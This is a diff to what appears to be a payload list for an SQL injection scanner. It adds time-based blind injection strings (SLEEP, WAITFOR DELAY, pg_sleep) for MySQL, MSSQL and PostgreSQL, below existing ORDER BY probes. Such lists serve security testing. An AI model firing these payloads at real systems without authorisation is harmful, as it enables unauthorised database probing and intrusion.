@@ -31,3 +31,25 @@
 1' ORDER BY 3--+
 1' ORDER BY 1,2--+
 1' ORDER BY 1,2,3--+
+
+# [time-based]
+# Lines below this marker are time-based payloads, grouped by engine.
+# Loader keeps unclassified lines above as regular (error-based) payloads.
+# [mysql]
+' AND SLEEP(5)-- -
+" AND SLEEP(5)-- -
+1' AND SLEEP(5)-- -
+1 AND SLEEP(5)
+' OR SLEEP(5)-- -
+# [mssql]
+'; WAITFOR DELAY '0:0:5'-- -
+"; WAITFOR DELAY '0:0:5'-- -
+1'; WAITFOR DELAY '0:0:5'-- -
+1); WAITFOR DELAY '0:0:5'-- -
+' OR 1=1; WAITFOR DELAY '0:0:5'-- -
+# [postgresql]
+'; SELECT pg_sleep(5)-- -
+"; SELECT pg_sleep(5)-- -
+1'; SELECT pg_sleep(5)-- -
+1 AND (SELECT 5 FROM pg_sleep(5))-- -
+' OR (SELECT 5 FROM pg_sleep(5)) IS NOT NULL-- -
